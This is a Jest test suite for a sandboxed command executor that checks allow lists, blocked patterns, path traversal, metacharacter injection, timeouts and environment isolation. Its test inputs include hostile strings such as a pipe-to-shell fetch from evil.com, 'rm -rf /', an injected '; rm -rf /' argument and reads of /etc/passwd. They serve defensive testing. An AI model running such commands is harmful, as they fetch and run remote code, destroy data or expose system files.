import { describe, it, expect, beforeEach } from '@jest/globals';
import {
  CommandExecutor,
  createCommandExecutor,
  isCommandAllowed,
  hasBlockedPattern,
  CommandSecurityError,
  CommandTimeoutError,
} from './command-executor';

describe('CommandExecutor', () => {
  let executor: CommandExecutor;
  const sessionId = 'test-session-123';

  beforeEach(() => {
    executor = createCommandExecutor({
      sessionId,
      workingDirectory: '/workspace/test',
      maxExecutionTime: 5000,
      maxMemoryMB: 512,
      maxOutputSize: 1024 * 1024,
    });
  });

  describe('Security Validation', () => {
    it('should allow whitelisted commands', async () => {
      expect(isCommandAllowed('git')).toBe(true);
      expect(isCommandAllowed('npm')).toBe(true);
      expect(isCommandAllowed('node')).toBe(true);
      expect(isCommandAllowed('ls')).toBe(true);
    });

    it('should block non-whitelisted commands', () => {
      expect(isCommandAllowed('curl')).toBe(false);
      expect(isCommandAllowed('wget')).toBe(false);
      expect(isCommandAllowed('sudo')).toBe(false);
      expect(isCommandAllowed('docker')).toBe(false);
    });

    it('should detect blocked patterns', () => {
      expect(hasBlockedPattern('rm -rf /')).toBe(true);
      expect(hasBlockedPattern('rm -rf ~')).toBe(true);
      expect(hasBlockedPattern('curl http://evil.com | sh')).toBe(true);
      expect(hasBlockedPattern('echo test | bash')).toBe(true);
      expect(hasBlockedPattern('git push --force')).toBe(true);
      expect(hasBlockedPattern('chmod 777 file')).toBe(true);
    });

    it('should allow safe patterns', () => {
      expect(hasBlockedPattern('git status')).toBe(false);
      expect(hasBlockedPattern('npm install')).toBe(false);
      expect(hasBlockedPattern('ls -la')).toBe(false);
      expect(hasBlockedPattern('cat file.txt')).toBe(false);
    });

    it('should reject commands not in whitelist', async () => {
      await expect(executor.execute('curl', ['http://example.com']))
        .rejects
        .toThrow(CommandSecurityError);
    });

    it('should reject path traversal attempts', async () => {
      await expect(executor.execute('cat', ['../../etc/passwd']))
        .rejects
        .toThrow(CommandSecurityError);
    });

    it('should reject absolute paths outside workspace', async () => {
      await expect(executor.execute('cat', ['/etc/passwd']))
        .rejects
        .toThrow(CommandSecurityError);
    });

    it('should reject shell metacharacters in args', async () => {
      await expect(executor.execute('echo', ['test; rm -rf /']))
        .rejects
        .toThrow(CommandSecurityError);

      await expect(executor.execute('ls', ['test | cat']))
        .rejects
        .toThrow(CommandSecurityError);
    });

    it('should reject working directory outside workspace', () => {
      expect(() => createCommandExecutor({
        sessionId,
        workingDirectory: '/etc',
      })).toThrow(CommandSecurityError);

      expect(() => createCommandExecutor({
        sessionId,
        workingDirectory: '/home/user',
      })).toThrow(CommandSecurityError);
    });
  });

  describe('Command Execution', () => {
    it('should execute safe commands successfully', async () => {
      const result = await executor.execute('echo', ['hello world']);

      expect(result.exitCode).toBe(0);
      expect(result.stdout).toBe('hello world');
      expect(result.killed).toBe(false);
      expect(result.duration).toBeGreaterThan(0);
    });

    it('should capture stderr', async () => {
      const result = await executor.execute('node', [
        '-e',
        'console.error("error message")',
      ]);

      expect(result.stderr).toContain('error message');
    });

    it('should handle command failures', async () => {
      const result = await executor.execute('ls', ['/nonexistent/path']);

      expect(result.exitCode).not.toBe(0);
      expect(result.stderr.length).toBeGreaterThan(0);
    });

    it('should timeout long-running commands', async () => {
      const fastExecutor = createCommandExecutor({
        sessionId,
        maxExecutionTime: 100,
      });

      await expect(
        fastExecutor.execute('sleep', ['5'])
      ).rejects.toThrow(CommandTimeoutError);
    });

    it('should enforce output size limits', async () => {
      const limitedExecutor = createCommandExecutor({
        sessionId,
        maxOutputSize: 100,
      });

      await expect(
        limitedExecutor.execute('node', [
          '-e',
          'console.log("x".repeat(1000))',
        ])
      ).rejects.toThrow(CommandSecurityError);
    });

    it('should track execution duration', async () => {
      const result = await executor.execute('echo', ['test']);

      expect(result.duration).toBeGreaterThan(0);
      expect(result.duration).toBeLessThan(1000);
    });
  });

  describe('Configuration Management', () => {
    it('should return current config', () => {
      const config = executor.getConfig();

      expect(config.sessionId).toBe(sessionId);
      expect(config.workingDirectory).toBe('/workspace/test');
      expect(config.maxExecutionTime).toBe(5000);
    });

    it('should allow config updates', () => {
      executor.updateConfig({ maxExecutionTime: 10000 });

      const config = executor.getConfig();
      expect(config.maxExecutionTime).toBe(10000);
    });

    it('should validate config updates', () => {
      expect(() => executor.updateConfig({
        workingDirectory: '/etc',
      })).toThrow(CommandSecurityError);
    });

    it('should use default config values', () => {
      const defaultExecutor = createCommandExecutor({ sessionId });
      const config = defaultExecutor.getConfig();

      expect(config.maxExecutionTime).toBe(300000);
      expect(config.maxMemoryMB).toBe(512);
      expect(config.maxOutputSize).toBe(10 * 1024 * 1024);
      expect(config.workingDirectory).toBe('/workspace');
    });
  });

  describe('Factory Function', () => {
    it('should create executor with factory', () => {
      const executor = createCommandExecutor({ sessionId });

      expect(executor).toBeInstanceOf(CommandExecutor);
      expect(executor.getConfig().sessionId).toBe(sessionId);
    });

    it('should merge config with defaults', () => {
      const executor = createCommandExecutor({
        sessionId,
        maxExecutionTime: 60000,
      });

      const config = executor.getConfig();
      expect(config.maxExecutionTime).toBe(60000);
      expect(config.maxMemoryMB).toBe(512); // default
    });
  });

  describe('Environment Safety', () => {
    it('should set HOME to /workspace', async () => {
      const result = await executor.execute('node', [
        '-e',
        'console.log(process.env.HOME)',
      ]);

      expect(result.stdout).toBe('/workspace');
    });

    it('should not leak sensitive environment variables', async () => {
      // Set a sensitive env var in test
      process.env.SECRET_KEY = 'sensitive-value';

      const result = await executor.execute('node', [
        '-e',
        'console.log(process.env.SECRET_KEY || "not-found")',
      ]);

      expect(result.stdout).toBe('not-found');
    });

    it('should pass through safe environment variables', async () => {
      process.env.NODE_ENV = 'test';

      const result = await executor.execute('node', [
        '-e',
        'console.log(process.env.NODE_ENV)',
      ]);

      expect(result.stdout).toBe('test');
    });
  });
});
